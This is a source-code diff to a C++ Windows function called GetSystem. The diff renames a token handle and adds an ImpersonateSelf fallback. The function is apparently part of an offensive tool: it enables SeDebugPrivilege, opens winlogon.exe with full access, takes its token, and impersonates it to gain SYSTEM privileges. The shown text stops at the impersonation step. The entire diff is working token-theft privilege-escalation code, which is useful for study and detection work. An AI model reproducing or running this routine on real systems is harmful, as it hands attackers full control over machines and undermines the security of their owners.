@@ -3,15 +3,20 @@
 bool GetSystem()
 { 
 	// let's first make sure we have the SeDebugPrivilege enabled 
-	HANDLE tempHandle;
-	auto success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempHandle);
-	if (!success)
+	HANDLE tempTokenHandle;
+	auto success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempTokenHandle);
+	if (!success && GetLastError() == ERROR_NO_TOKEN)
 	{
-		Error(GetLastError());
+		ImpersonateSelf(SecurityImpersonation);
+		std::cout << "[!] Calling ImpersonateSelf because thread is not impersonating...\n";
+		success = OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, false, &tempTokenHandle);
+	} 
+	else if(!success)
+	{
 		std::cout << "[-] Failed to open current thread token, exiting...\n";
 		return 1;
 	}
-	RAII::Handle currentToken = tempHandle;
+	RAII::Handle currentToken = tempTokenHandle;
 
 	success = SetPrivilege(currentToken.GetHandle(), L"SeDebugPrivilege", true);
 	if (!success) return 1;
@@ -24,14 +29,15 @@ bool GetSystem()
 	}
 	else std::cout << "[+] Got a PROCESS_ALL_ACCESS handle to winlogon.exe!\n";
 
-	success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempHandle);
+	// we reuse tempTokenHandle and fill it with the token of winlogon.exe so that we don't have to make a new variable 
+	success = OpenProcessToken(winlogonHandle.GetHandle(), TOKEN_QUERY | TOKEN_DUPLICATE, &tempTokenHandle);
 	if (!success)
 	{
 		std::cout << "[-] Couldn't get a handle to winlogon.exe's token, exiting...\n";
 		return success;
 	}
 	else std::cout << "[+] Opened a handle to winlogon.exe's token!\n";
-	RAII::Handle tokenHandle = tempHandle;
+	RAII::Handle tokenHandle = tempTokenHandle;
 	
 	success = ImpersonateLoggedOnUser(tokenHandle.GetHandle());
 	if (!success)
